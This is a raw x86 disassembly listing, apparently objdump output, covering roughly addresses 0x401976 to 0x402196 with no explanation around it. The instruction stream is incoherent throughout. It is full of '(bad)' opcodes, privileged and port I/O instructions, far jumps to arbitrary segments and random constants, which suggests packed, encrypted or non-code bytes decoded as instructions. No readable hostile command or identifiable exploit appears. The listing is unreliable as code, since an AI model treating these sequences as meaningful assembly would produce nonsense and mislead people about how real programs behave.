  401976:	outs   dx,BYTE PTR ds:[esi]
  401977:	sbb    esi,DWORD PTR [ecx+ebp*8+0x45]
  40197b:	jp     0x401985
  40197d:	adc    eax,0x7487d952
  401982:	sub    eax,0xa99c7d9d
  401987:	addr16 mov esp,0xe05633b7
  40198d:	popf   
  40198e:	xchg   BYTE PTR [ecx-0x4e199d37],bl
  401994:	dec    esp
  401995:	in     al,0xff
  401997:	daa    
  401998:	pop    esp
  401999:	lds    ecx,FWORD PTR [edx-0x33]
  40199c:	sub    dh,BYTE PTR [eax+0x668b8d55]
  4019a2:	aas    
  4019a3:	fnstsw WORD PTR [ebx-0xa]
  4019a6:	jno    0x4019f1
  4019a8:	pop    esi
  4019a9:	dec    esi
  4019aa:	fwait
  4019ab:	loopne 0x4019eb
  4019ad:	jp     0x401a2a
  4019af:	dec    edx
  4019b0:	jmp    0x114e:0xd2927105
  4019b7:	push   ds
  4019b8:	hlt    
  4019b9:	aad    0x2c
  4019bb:	jp     0x401960
  4019bd:	jbe    0x401942
  4019bf:	or     al,0x84
  4019c1:	mov    esi,0x9dca2616
  4019c6:	and    al,0x9b
  4019c8:	out    0x9b,al
  4019ca:	xor    eax,0xc217f4dc
  4019cf:	cld    
  4019d0:	repz sbb bl,BYTE PTR [edx+0x6d]
  4019d4:	push   edx
  4019d5:	adc    eax,0xbf39e9dc
  4019da:	pop    ss
  4019db:	or     BYTE PTR ds:0x5a4afe70,ah
  4019e1:	push   edx
  4019e2:	fwait
  4019e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019e4:	pop    esi
  4019e5:	sar    DWORD PTR [ecx-0x46],1
  4019e8:	add    eax,0x23ffc35f
  4019ed:	outs   dx,BYTE PTR ds:[esi]
  4019ee:	dec    eax
  4019ef:	adc    bh,BYTE PTR [edi+0x2ba704f8]
  4019f5:	(bad)  
  4019f6:	jbe    0x4019a3
  4019f8:	clc    
  4019f9:	in     al,dx
  4019fa:	scas   al,BYTE PTR es:[edi]
  4019fb:	fbstp  TBYTE PTR [ebx+0x4d782ab6]
  401a01:	mov    ds:0xfc1ffc81,eax
  401a06:	aam    0x6c
  401a08:	shl    edi,1
  401a0a:	shl    bl,cl
  401a0c:	fmul   st,st(7)
  401a0e:	cmc    
  401a0f:	ja     0x4019db
  401a11:	mov    eax,0xa36b87f2
  401a16:	retf   
  401a17:	add    BYTE PTR [ecx-0x3b7454da],0x23
  401a1e:	adc    edi,DWORD PTR [ebp-0x29]
  401a21:	leave  
  401a22:	mov    cl,0x23
  401a24:	xchg   edi,eax
  401a25:	outs   dx,DWORD PTR ds:[esi]
  401a26:	mov    bl,0x3b
  401a28:	mov    ds:0x7e8894e6,al
  401a2d:	es jmp 0x249352cc
  401a33:	sbb    DWORD PTR [esi+0x76a32fe5],0x16
  401a3a:	xchg   esi,eax
  401a3b:	sbb    al,0xb5
  401a3d:	jg     0x4019cc
  401a3f:	fstp   TBYTE PTR [eax]
  401a41:	pop    esp
  401a42:	inc    ecx
  401a43:	test   eax,0x53a7c5b4
  401a48:	ret    0x714a
  401a4b:	pop    esp
  401a4c:	ret    0x2275
  401a4f:	jmp    0x401aaa
  401a51:	push   es
  401a52:	or     DWORD PTR [esp+esi*2],edi
  401a55:	lock inc eax
  401a57:	imul   esi,DWORD PTR [ecx+0x9],0xaba397b6
  401a5e:	adc    eax,edx
  401a60:	push   DWORD PTR [ebx]
  401a62:	xchg   edx,eax
  401a63:	jle    0x401a80
  401a65:	out    0xf0,eax
  401a67:	adc    DWORD PTR [esi+0x53e015a9],0x18e23b2c
  401a71:	retf   
  401a72:	out    0xa9,eax
  401a74:	sub    ebp,DWORD PTR [esp+esi*1-0x50]
  401a78:	adc    eax,0x6d7b8d67
  401a7d:	pop    ss
  401a7e:	(bad)  [ebp-0x50]
  401a81:	sub    ah,BYTE PTR [edi]
  401a83:	js     0x401a1d
  401a85:	fsub   DWORD PTR [eax-0x6a4df584]
  401a8b:	in     eax,dx
  401a8c:	inc    ecx
  401a8d:	cmp    dl,dl
  401a8f:	mov    eax,ds:0xef9e810d
  401a94:	cmp    dh,BYTE PTR [edi]
  401a96:	push   edi
  401a97:	arpl   WORD PTR [esi+0x7e],bx
  401a9a:	js     0x401b07
  401a9c:	add    BYTE PTR [edx+0x1e4afc5f],0x38
  401aa3:	mov    esi,0x2bfbb4e2
  401aa8:	gs call 0x8ef2dc0f
  401aae:	xor    eax,0xebd46115
  401ab3:	cmc    
  401ab4:	fwait
  401ab5:	mov    al,ds:0x76672002
  401aba:	(bad)  
  401abb:	js     0x401ad1
  401abd:	loop   0x401b12
  401abf:	ror    BYTE PTR [ebx+0x3b51e212],0xfe
  401ac6:	ds dec ecx
  401ac8:	mov    ch,bl
  401aca:	mov    eax,ds:0x4f2146a9
  401acf:	gs (bad) 
  401ad1:	clc    
  401ad2:	and    DWORD PTR [esi*1+0x5c815b08],ecx
  401ad9:	jmp    0x7d7c2a76
  401ade:	pop    ebp
  401adf:	mov    ds:0x414def6f,eax
  401ae4:	cli    
  401ae5:	pop    eax
  401ae6:	loopne 0x401acc
  401ae8:	push   cs
  401ae9:	int3   
  401aea:	mov    ch,cl
  401aec:	mov    dh,dl
  401aee:	adc    DWORD PTR [ebp-0x5d403c76],esi
  401af4:	adc    al,0xf0
  401af6:	fs adc al,bh
  401af9:	pusha  
  401afa:	sub    eax,0x444c4686
  401aff:	fs xchg edi,eax
  401b01:	out    dx,eax
  401b02:	inc    DWORD PTR [ecx-0x5c27aa09]
  401b08:	aam    0x2e
  401b0a:	nop
  401b0b:	stc    
  401b0c:	pushf  
  401b0d:	adc    eax,0x87ddfa93
  401b12:	mov    al,ds:0x866bd236
  401b17:	add    al,0x19
  401b19:	add    esi,DWORD PTR [esi+0x2692a59]
  401b1f:	mov    DWORD PTR [esi],0x122954c2
  401b25:	add    dh,BYTE PTR [ecx+0x30d9451d]
  401b2b:	mov    ch,0xef
  401b2d:	pop    ecx
  401b2e:	mov    dl,0x50
  401b30:	adc    edi,DWORD PTR [edi]
  401b32:	lock push ds
  401b34:	pop    ds
  401b35:	inc    ebp
  401b36:	call   0x4fbe:0x32600313
  401b3d:	(bad)  
  401b3e:	rcl    ah,1
  401b40:	dec    ebp
  401b41:	mov    esp,0x895f392a
  401b46:	sub    bl,dh
  401b48:	div    BYTE PTR [edx-0x42]
  401b4b:	sbb    bh,bl
  401b4d:	xor    ecx,ebp
  401b4f:	sub    esp,DWORD PTR [ecx+0x53]
  401b52:	int    0xbb
  401b54:	inc    ecx
  401b55:	xor    ecx,esp
  401b57:	dec    ecx
  401b58:	add    al,0xc0
  401b5a:	xchg   esp,eax
  401b5b:	inc    edx
  401b5c:	cld    
  401b5d:	ins    DWORD PTR es:[edi],dx
  401b5e:	push   0x7b
  401b60:	adc    eax,0x68d9bf34
  401b65:	retf   
  401b66:	gs ret 0xeb0d
  401b6a:	add    edx,DWORD PTR [ebx-0x13889e6a]
  401b70:	loop   0x401b37
  401b72:	dec    esi
  401b73:	jle    0x401bb1
  401b75:	and    ebp,DWORD PTR [eax+0x3d3527f8]
  401b7b:	mov    al,0xd3
  401b7d:	int3   
  401b7e:	rol    DWORD PTR [esi],0xa
  401b81:	xacquire xchg DWORD PTR [eax+0x72],edi
  401b85:	pop    esi
  401b86:	or     eax,0x1adc2a68
  401b8b:	xchg   ebx,eax
  401b8c:	popf   
  401b8d:	popa   
  401b8e:	add    al,0x8b
  401b90:	cwde   
  401b91:	jecxz  0x401b3e
  401b93:	sub    eax,0x6b82ab8a
  401b98:	mov    esi,DWORD PTR [edx+0x3c3e4b70]
  401b9e:	add    ebx,DWORD PTR [esi]
  401ba0:	mov    esi,0xf07ff640
  401ba5:	mov    eax,0xc8b8be01
  401baa:	fs xchg ecx,eax
  401bac:	mov    ah,0x38
  401bae:	jae    0x401c24
  401bb0:	dec    ebx
  401bb1:	imul   ebp,DWORD PTR [edx+0x10],0x59
  401bb5:	gs jno 0x401c01
  401bb8:	sub    ah,BYTE PTR [ebx]
  401bba:	lock js 0x401c15
  401bbd:	mov    dl,0x97
  401bbf:	cwde   
  401bc0:	mov    cl,0x87
  401bc2:	je     0x401b68
  401bc4:	out    dx,eax
  401bc5:	iret   
  401bc6:	test   BYTE PTR [ebx+0x57],ah
  401bc9:	icebp  
  401bca:	sub    al,0x3d
  401bcc:	dec    eax
  401bcd:	add    BYTE PTR [ebp-0x3],0x4a
  401bd1:	sub    al,0xa5
  401bd3:	or     esp,DWORD PTR [ecx+0x2fcbf5f3]
  401bd9:	aas    
  401bda:	imul   eax,DWORD PTR [eax],0xffffff8b
  401bdd:	ja     0x401bcb
  401bdf:	mov    cl,0xe8
  401be1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401be2:	ja     0x401bba
  401be4:	xchg   esp,eax
  401be5:	test   eax,0x8438c8c1
  401bea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401beb:	push   ecx
  401bec:	pop    ebp
  401bed:	scas   al,BYTE PTR es:[edi]
  401bee:	dec    edx
  401bef:	push   esp
  401bf0:	loop   0x401b80
  401bf2:	jne    0x401c0c
  401bf4:	iret   
  401bf5:	cmp    ebx,DWORD PTR [ebx]
  401bf7:	(bad)  
  401bf8:	aad    0xdc
  401bfa:	stos   BYTE PTR es:[edi],al
  401bfb:	pop    esi
  401bfc:	(bad)  
  401bfd:	and    bl,cl
  401bff:	aam    0xe0
  401c01:	lea    ecx,fs:[edx+0x2f572fa9]
  401c08:	(bad)  
  401c09:	cmp    ah,BYTE PTR [ecx]
  401c0b:	mov    ecx,0x15a0376
  401c10:	mov    dh,0xe2
  401c12:	cmp    esi,DWORD PTR [ebx+edx*8-0x56]
  401c16:	sbb    eax,ebp
  401c18:	mov    ebx,0x5ca9a039
  401c1d:	bound  eax,QWORD PTR [esi]
  401c1f:	(bad)  [ebp+0x14]
  401c22:	mov    esi,0x18842f29
  401c27:	dec    edx
  401c28:	daa    
  401c29:	js     0x401bbe
  401c2b:	nop
  401c2c:	sub    bh,BYTE PTR [ebp-0x65dea037]
  401c32:	addr16 rcr dl,1
  401c35:	push   edx
  401c36:	out    dx,al
  401c37:	frstor [ebx-0x9aa0482]
  401c3d:	push   es
  401c3e:	sbb    esi,edi
  401c40:	rol    cl,cl
  401c42:	and    bl,0x79
  401c45:	call   0x1d4ffea8
  401c4a:	xor    BYTE PTR [esi],ch
  401c4c:	adc    BYTE PTR [ebp+0xf],0x52
  401c50:	shl    BYTE PTR [ebp+0x32],cl
  401c53:	les    eax,FWORD PTR [ebx]
  401c55:	daa    
  401c56:	mov    ebp,0x17ac4dbf
  401c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c5c:	lods   eax,DWORD PTR ds:[esi]
  401c5d:	sbb    al,BYTE PTR [ebx]
  401c5f:	sbb    al,0x4
  401c61:	stos   BYTE PTR es:[edi],al
  401c62:	dec    BYTE PTR ds:0x34accf4
  401c68:	sti    
  401c69:	add    DWORD PTR [edi+ebx*2+0x27],ecx
  401c6d:	ror    BYTE PTR [edi-0xd],1
  401c70:	stos   DWORD PTR es:[edi],eax
  401c71:	mov    cl,dh
  401c73:	mov    BYTE PTR [ebx-0x40b24641],ah
  401c79:	in     al,0x10
  401c7b:	or     BYTE PTR [edi+0x13eb2402],dl
  401c81:	outs   dx,BYTE PTR ds:[esi]
  401c82:	add    esp,0x19
  401c85:	(bad)  
  401c86:	fmul   QWORD PTR [esi+0x63a3215d]
  401c8c:	adc    al,0xef
  401c8e:	call   0x1d25:0xc4de8e1d
  401c95:	fsubp  st(4),st
  401c97:	add    DWORD PTR ds:0x7d58a2c0,esi
  401c9d:	(bad)  ds:0x1099ea02
  401ca3:	enter  0xddb0,0x5c
  401ca7:	mov    ebx,0x3601f197
  401cac:	shl    ebp,0x32
  401caf:	push   esi
  401cb0:	adc    ebx,DWORD PTR [ebx+0x3f]
  401cb3:	test   edx,eax
  401cb5:	mov    bh,0x71
  401cb7:	lea    edx,[ebp+0x31]
  401cba:	adc    eax,0x743722f9
  401cbf:	add    al,BYTE PTR [edx+0x6aa65ef2]
  401cc5:	rcr    BYTE PTR [edx],cl
  401cc7:	pop    ds
  401cc8:	out    dx,al
  401cc9:	cmp    BYTE PTR [ebx],bl
  401ccb:	loopne 0x401cd9
  401ccd:	mov    BYTE PTR [ebx+0x28],ah
  401cd0:	mov    esi,0x7b44d147
  401cd5:	aaa    
  401cd6:	cmp    esi,DWORD PTR [ebp-0x2dfee3c]
  401cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cdd:	sbb    bl,BYTE PTR [esi-0x48fec427]
  401ce3:	inc    eax
  401ce4:	sub    al,0xc3
  401ce6:	in     al,dx
  401ce7:	sbb    DWORD PTR [ebx-0x3c],esp
  401cea:	sub    al,0xd6
  401cec:	bound  edx,QWORD PTR [edi+0x12]
  401cef:	and    DWORD PTR [ebx+0x7650b3ac],edi
  401cf5:	mov    ebx,DWORD PTR [edi+eax*1-0x19ea292]
  401cfc:	lods   al,BYTE PTR ds:[esi]
  401cfd:	enter  0x2192,0x69
  401d01:	xchg   edx,eax
  401d02:	and    ah,BYTE PTR [eax]
  401d04:	add    al,0xf9
  401d06:	clc    
  401d07:	pop    DWORD PTR [ebx-0x681153e5]
  401d0d:	mov    bh,0x75
  401d0f:	sti    
  401d10:	dec    edx
  401d11:	mov    al,ds:0xb4198228
  401d16:	jnp    0x401ce8
  401d18:	rol    BYTE PTR [ebx-0x4745b961],cl
  401d1e:	pushf  
  401d1f:	data16 add dh,0x2d
  401d23:	sub    BYTE PTR [ecx],ah
  401d25:	out    dx,al
  401d26:	push   0x17ea3118
  401d2b:	les    esi,FWORD PTR [ebx+edx*2+0x51778258]
  401d32:	or     ebx,edi
  401d34:	inc    edi
  401d35:	add    BYTE PTR [ebp-0x45],bh
  401d38:	xchg   esi,eax
  401d39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d3a:	imul   ebx,DWORD PTR [ebx-0x7268b3f6],0xffffffde
  401d41:	cmp    BYTE PTR [esi-0x2a128e7a],0x76
  401d48:	jb     0x401d21
  401d4a:	xor    ebx,ebx
  401d4c:	scas   eax,DWORD PTR es:[edi]
  401d4d:	test   eax,0xf3e2f046
  401d52:	jo     0x401da3
  401d54:	adc    esi,DWORD PTR [edi-0x4c2e8da]
  401d5a:	pop    ecx
  401d5b:	inc    esi
  401d5c:	and    BYTE PTR [ebp+0x1a],cl
  401d5f:	fild   QWORD PTR [ebp+ebp*4-0x5a6cb72]
  401d66:	mov    esi,0xeda106a9
  401d6b:	cwde   
  401d6c:	cli    
  401d6d:	repnz xchg esi,eax
  401d6f:	mov    ecx,0x36660a27
  401d74:	mov    edx,0xb8f54848
  401d79:	outs   dx,BYTE PTR ds:[esi]
  401d7a:	fldcw  WORD PTR [ebp-0xbd7374]
  401d80:	xchg   esi,eax
  401d81:	cmp    ecx,DWORD PTR [edi-0x477dbc0b]
  401d87:	adc    bl,0x29
  401d8a:	out    dx,al
  401d8b:	loop   0x401d76
  401d8d:	jecxz  0x401df5
  401d8f:	mov    dh,0x10
  401d91:	inc    edx
  401d92:	aas    
  401d93:	les    esi,FWORD PTR [edi+edi*8]
  401d96:	xor    DWORD PTR [esi+0x57a50749],0x29
  401d9d:	in     al,dx
  401d9e:	or     BYTE PTR [esi-0x7a9e2a41],al
  401da4:	jno    0x401d70
  401da6:	mov    WORD PTR [eax+0x6913f821],?
  401dac:	xchg   ebx,ebp
  401dae:	es push ebp
  401db0:	add    esp,DWORD PTR [edi]
  401db2:	jnp    0x401da1
  401db4:	sbb    ebp,DWORD PTR [edi+eax*1-0x21]
  401db8:	(bad)  
  401db9:	rol    BYTE PTR [esi],1
  401dbb:	push   edx
  401dbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dbd:	xor    al,0xd8
  401dbf:	fwait
  401dc0:	ins    BYTE PTR es:[edi],dx
  401dc1:	adc    DWORD PTR [esi],0x78
  401dc4:	aas    
  401dc5:	mov    esi,0x7cdd2831
  401dca:	hlt    
  401dcb:	pop    ebx
  401dcc:	call   0x74f68f78
  401dd1:	aas    
  401dd2:	pop    esi
  401dd3:	das    
  401dd4:	lahf   
  401dd5:	mov    ch,0xf1
  401dd7:	pop    ds
  401dd8:	popa   
  401dd9:	shr    DWORD PTR [ecx],0x77
  401ddc:	and    edi,edi
  401dde:	mov    ebp,0xbce5e874
  401de3:	(bad)  [eax]
  401de5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401de6:	in     al,dx
  401de7:	jmp    0xd6b2ee9b
  401dec:	jae    0x401df8
  401dee:	rol    dl,0xf1
  401df1:	mov    ah,0x3e
  401df3:	dec    esp
  401df4:	ss jb  0x401e4f
  401df7:	mov    ch,0x5c
  401df9:	push   ebx
  401dfa:	push   ss
  401dfb:	shr    BYTE PTR [ebx],cl
  401dfd:	and    esp,ebx
  401dff:	leave  
  401e00:	dec    edi
  401e01:	inc    eax
  401e02:	lock or DWORD PTR [ebx],ecx
  401e05:	rcl    DWORD PTR [ebp-0x715ce120],cl
  401e0b:	fstp   TBYTE PTR [eax]
  401e0d:	jmp    0xb249:0x1b0aa491
  401e14:	shr    edx,0xea
  401e17:	inc    eax
  401e18:	add    eax,0xdfcc3373
  401e1d:	lea    ebx,[edx-0x41206ce3]
  401e23:	mov    esi,0x9371b235
  401e28:	cmp    ebx,esi
  401e2a:	mov    edx,0x86b9292d
  401e2f:	xor    DWORD PTR [ecx+ebx*8-0x3369ba3a],ebp
  401e36:	fistp  WORD PTR [eax-0x3b]
  401e39:	icebp  
  401e3a:	sub    DWORD PTR [ecx-0x28],ebp
  401e3d:	cmp    BYTE PTR [ecx],ah
  401e3f:	pop    esp
  401e40:	jmp    0x401ddc
  401e42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e43:	mov    ah,0x4f
  401e45:	mov    edi,0x29f56788
  401e4a:	sbb    DWORD PTR [ecx-0xf],0x5c
  401e4e:	test   al,0xf5
  401e50:	call   0xf4451cf5
  401e55:	out    0xc8,eax
  401e57:	xor    BYTE PTR [esi],dh
  401e59:	add    BYTE PTR [edi-0x6c59172a],cl
  401e5f:	ret    
  401e60:	jno    0x401e2f
  401e62:	inc    esp
  401e63:	mov    dl,0xbf
  401e65:	dec    esp
  401e66:	inc    edx
  401e67:	ja     0x401ea3
  401e69:	push   0x6
  401e6b:	lods   eax,DWORD PTR ds:[esi]
  401e6c:	inc    esp
  401e6d:	sar    DWORD PTR [edx],1
  401e6f:	and    al,0x4a
  401e71:	dec    esp
  401e72:	xchg   esi,eax
  401e73:	push   eax
  401e74:	xchg   ebx,eax
  401e75:	mov    esp,0x87ed8233
  401e7a:	or     BYTE PTR [eax-0x5ff4c50],dh
  401e80:	in     eax,0x33
  401e82:	ss pushf 
  401e84:	mov    WORD PTR [ecx-0x4d9ddb3d],cs
  401e8a:	data16 ja 0x401ebc
  401e8d:	xor    ah,cl
  401e8f:	addr16 (bad) 
  401e91:	fwait
  401e92:	mov    cl,0xf7
  401e94:	and    al,0x59
  401e96:	inc    eax
  401e97:	jge    0x401e50
  401e99:	pop    ebx
  401e9a:	cmp    esp,DWORD PTR [edx]
  401e9c:	mov    edi,0xa41da8d9
  401ea1:	add    esi,ecx
  401ea3:	xchg   edx,eax
  401ea4:	pop    ds
  401ea5:	rcr    DWORD PTR [ebp+0x7df320eb],1
  401eab:	aam    0x7a
  401ead:	arpl   WORD PTR [ecx+0x659950a5],si
  401eb3:	dec    esi
  401eb4:	sahf   
  401eb5:	or     bl,BYTE PTR [ecx+0x561c7739]
  401ebb:	inc    esi
  401ebc:	clc    
  401ebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ebe:	sbb    BYTE PTR [ebp+0xb],bh
  401ec1:	(bad)  
  401ec2:	jmp    0x9286:0x4f0be93b
  401ec9:	add    BYTE PTR [esi],ah
  401ecb:	mov    ds:0xe6db1342,eax
  401ed0:	pop    esi
  401ed1:	rcl    DWORD PTR [eax],cl
  401ed3:	int3   
  401ed4:	inc    ebx
  401ed5:	scas   eax,DWORD PTR es:[edi]
  401ed6:	ret    
  401ed7:	pop    ds
  401ed8:	sub    DWORD PTR ds:[edx-0x7],0x69
  401edd:	arpl   bp,si
  401edf:	imul   eax,esp,0x3ca2e73d
  401ee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ee6:	mov    ebp,0x198407d3
  401eeb:	mov    esi,0xbcba45ff
  401ef0:	or     cl,0x8e
  401ef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ef4:	xchg   edx,eax
  401ef5:	sti    
  401ef6:	mov    ecx,DWORD PTR [ecx-0xd]
  401ef9:	push   esi
  401efa:	loopne 0x401f10
  401efc:	xor    eax,0x3ea53cec
  401f01:	mov    bl,0x5f
  401f03:	and    DWORD PTR [esp+esi*1+0x1c71f4ee],ebx
  401f0a:	adc    al,0xae
  401f0c:	inc    eax
  401f0d:	add    DWORD PTR [eax],esp
  401f0f:	xor    eax,0xa6f89567
  401f14:	pushf  
  401f15:	inc    esp
  401f16:	nop
  401f17:	mov    ch,0xba
  401f19:	test   DWORD PTR [edi-0x30fec9bf],ebx
  401f1f:	addr16 mov cx,0x38b3
  401f24:	push   esi
  401f25:	xchg   edi,eax
  401f26:	jae    0x401f6c
  401f28:	jo     0x401ec0
  401f2a:	into   
  401f2b:	stc    
  401f2c:	lods   eax,DWORD PTR ds:[esi]
  401f2d:	ret    
  401f2e:	or     cl,BYTE PTR [edi+0x26]
  401f31:	xchg   esi,eax
  401f32:	ds mov bl,0x2b
  401f35:	test   DWORD PTR [esi+0x2],ebx
  401f38:	imul   DWORD PTR [edi]
  401f3a:	retf   
  401f3b:	bound  ebp,QWORD PTR ds:0xfe615c3d
  401f41:	cwde   
  401f42:	dec    ecx
  401f43:	dec    ebx
  401f44:	frstor [ebp-0x728609bd]
  401f4a:	adc    eax,0x78a8153e
  401f4f:	mov    ds:0xb0f33020,al
  401f54:	inc    eax
  401f55:	jmp    FWORD PTR [ebx+edi*2-0x8c573b1]
  401f5c:	neg    DWORD PTR ds:0x3446acb8
  401f62:	mov    eax,0x7360197c
  401f67:	push   ebx
  401f68:	(bad)  
  401f69:	push   eax
  401f6a:	sub    DWORD PTR [edx],0xaf24f2c5
  401f70:	test   al,0x49
  401f72:	scas   al,BYTE PTR es:[edi]
  401f73:	fistp  WORD PTR [eax+0x2ad2569d]
  401f79:	call   0x9c27:0xc3af4835
  401f80:	adc    BYTE PTR [edi-0xc],dh
  401f83:	mov    ebp,0x21511520
  401f88:	repnz aaa 
  401f8a:	loope  0x401fa4
  401f8c:	sub    esp,edx
  401f8e:	mov    ds:0x849747c1,al
  401f93:	fisttp QWORD PTR [ebp-0x2c9ed640]
  401f99:	mov    eax,0xd05c3f25
  401f9e:	adc    eax,0x2bf89e6
  401fa3:	cmc    
  401fa4:	imul   esp,DWORD PTR [edi],0x9d6415f
  401faa:	ror    DWORD PTR [esi-0x731dae78],1
  401fb0:	popf   
  401fb1:	in     eax,dx
  401fb2:	dec    ecx
  401fb3:	pop    es
  401fb4:	add    BYTE PTR [esi],dh
  401fb6:	not    ah
  401fb8:	adc    eax,0xf450a51c
  401fbd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fbf:	mov    eax,ds:0xcf53f59
  401fc4:	ja     0x402025
  401fc6:	push   0xdc3bf94b
  401fcb:	or     DWORD PTR ds:0x48bfd426,esi
  401fd1:	in     eax,0x9
  401fd3:	call   0xff638e90
  401fd8:	adc    DWORD PTR [edx-0x67fda118],ebx
  401fde:	xchg   esp,eax
  401fdf:	inc    ebp
  401fe0:	arpl   dx,si
  401fe2:	mov    ecx,0xd3cb7e9e
  401fe7:	jae    0x401f7d
  401fe9:	inc    esi
  401fea:	stc    
  401feb:	xchg   DWORD PTR [ebp+0x3a4785f0],ecx
  401ff1:	or     al,0x4a
  401ff3:	fdivrp st(1),st
  401ff5:	test   BYTE PTR [edi+ebp*8-0x1f],cl
  401ff9:	xchg   ecx,eax
  401ffa:	adc    eax,0x62a30e41
  401fff:	out    0x12,al
  402001:	cmp    ecx,esi
  402003:	call   0x7631:0x9301ca02
  40200a:	xchg   BYTE PTR [eax+0x2b],dh
  40200d:	adc    eax,0xeb079ac
  402012:	jl     0x402021
  402014:	fcmovb st,st(1)
  402016:	test   BYTE PTR [ebx-0x7de0b4b9],ah
  40201c:	(bad)  
  40201d:	adc    DWORD PTR [eax+0x71106cc1],eax
  402023:	loop   0x402014
  402025:	xchg   ecx,eax
  402026:	push   0xffffffb0
  402028:	and    esp,DWORD PTR [eax+0x243f6b8]
  40202e:	jle    0x402023
  402030:	les    esp,FWORD PTR [ecx]
  402032:	sub    DWORD PTR [ebp+0x47008359],esi
  402038:	mov    dh,0xf
  40203a:	cdq    
  40203b:	out    0x4e,eax
  40203d:	into   
  40203e:	retf   
  40203f:	loope  0x40202e
  402041:	xor    ebp,esi
  402043:	add    eax,DWORD PTR [eax-0x5aba7491]
  402049:	jmp    0x518dbb0b
  40204e:	jmp    0x402052
  402050:	mov    bh,0xec
  402052:	mov    bh,0xee
  402054:	fadd   QWORD PTR [edi+0x616a2b43]
  40205a:	in     al,0xeb
  40205c:	sbb    eax,0x8eb6c51b
  402061:	es xchg ebx,eax
  402063:	push   ebx
  402064:	jb     0x402038
  402066:	stos   DWORD PTR es:[edi],eax
  402067:	adc    al,BYTE PTR [bp-0x75]
  40206b:	or     al,ch
  40206d:	sub    eax,0xe30d52d8
  402072:	inc    edx
  402073:	and    DWORD PTR [eax+0x74e36061],0x43eb90fa
  40207d:	xlat   BYTE PTR ds:[ebx]
  40207e:	fst    DWORD PTR [ebx-0x68]
  402081:	(bad)  
  402082:	retf   
  402083:	shl    ecx,0x9
  402086:	je     0x402087
  402088:	rcr    DWORD PTR [ecx-0x2c20e557],0xd1
  40208f:	sbb    al,0xa7
  402091:	test   DWORD PTR [ebp+0x7347b14c],esi
  402097:	(bad)  
  402098:	sti    
  402099:	inc    edx
  40209a:	push   ss
  40209b:	scas   al,BYTE PTR es:[edi]
  40209c:	shl    BYTE PTR [edx],cl
  40209e:	inc    ebx
  40209f:	in     al,dx
  4020a0:	push   0x89cde27e
  4020a5:	aas    
  4020a6:	adc    edx,DWORD PTR [esi]
  4020a8:	jnp    0x402108
  4020aa:	and    BYTE PTR [ecx+edi*1],al
  4020ad:	fistp  QWORD PTR [ebx+0x4c406033]
  4020b3:	das    
  4020b4:	jle    0x4020a8
  4020b6:	xchg   ebx,eax
  4020b7:	fistp  QWORD PTR [esi*4-0x53ae2785]
  4020be:	and    ecx,DWORD PTR [eax-0x1f70d949]
  4020c4:	mov    ebx,0xeb21cd82
  4020c9:	ror    BYTE PTR [edx-0x5],0x68
  4020cd:	repz cdq 
  4020cf:	xor    BYTE PTR [edx],ch
  4020d1:	adc    DWORD PTR [ecx],edi
  4020d3:	sbb    eax,0x4f21e29f
  4020d8:	arpl   WORD PTR [edx+0x2b4adf07],si
  4020de:	je     0x4020c2
  4020e0:	lahf   
  4020e1:	jle    0x4020dc
  4020e3:	jo     0x4020ad
  4020e5:	xchg   BYTE PTR [ecx-0x4],dh
  4020e8:	adc    BYTE PTR [ebx],dh
  4020ea:	test   al,0x8b
  4020ec:	cmp    al,0x2f
  4020ee:	shl    BYTE PTR [eax-0x28],cl
  4020f1:	mov    ebx,0x2321f3e
  4020f6:	xchg   esp,eax
  4020f7:	inc    ebx
  4020f8:	mov    edx,0xb2c2bee4
  4020fd:	(bad)  [esi+0x38a407]
  402103:	out    0xf9,eax
  402105:	ds into 
  402107:	sahf   
  402108:	xchg   edx,eax
  402109:	sub    edi,DWORD PTR [ebp+0x53715cd6]
  40210f:	adc    esp,ecx
  402111:	xlat   BYTE PTR ds:[ebx]
  402112:	mov    WORD PTR [esi+eax*8-0x5abfabbd],cs
  402119:	in     eax,dx
  40211a:	dec    edi
  40211b:	sub    cl,BYTE PTR [edx]
  40211d:	es retf 
  40211f:	sub    esp,DWORD PTR [ecx+ebp*2-0x19]
  402123:	sbb    eax,0x91082189
  402128:	inc    edi
  402129:	mov    bh,0xcd
  40212b:	rcr    DWORD PTR [esi+eiz*1+0x60927f10],0xd7
  402133:	mov    ds:0x69e0e8c2,al
  402138:	xor    al,0x4e
  40213a:	cmp    eax,0xc7d8f5bc
  40213f:	rol    BYTE PTR [ebx+0x65fd0db],cl
  402145:	ja     0x40218f
  402147:	repz daa 
  402149:	xor    DWORD PTR [edi+eax*2+0x12bd2cf5],ecx
  402150:	sub    BYTE PTR [edx-0x40],cl
  402153:	loopne 0x4020f4
  402155:	ror    bl,cl
  402157:	(bad)  
  402158:	sti    
  402159:	dec    ecx
  40215a:	add    DWORD PTR [edi+edx*4-0x60],0xfffffff1
  40215f:	leave  
  402160:	icebp  
  402161:	std    
  402162:	adc    ebp,DWORD PTR [ecx-0x1d05b82]
  402168:	sub    DWORD PTR [edx+ebp*4+0x1b7f0a87],ecx
  40216f:	(bad)  
  402170:	fist   WORD PTR [esi]
  402172:	nop
  402173:	(bad)  
  402175:	test   DWORD PTR [ecx+0x0],esp
  402178:	iret   
  402179:	push   es
  40217a:	sbb    dh,BYTE PTR [eax-0x23ba96d2]
  402180:	daa    
  402181:	(bad)  
  402182:	cmp    ecx,DWORD PTR [edx-0x409f4164]
  402188:	mov    esi,0x5cca1cf0
  40218d:	into   
  40218e:	add    DWORD PTR [ebp+0x34],ebp
  402191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402192:	sbb    ebx,ecx
  402194:	mov    ebx,ebp
  402196:	and    ecx,DWORD PTR [ebp+0x42]
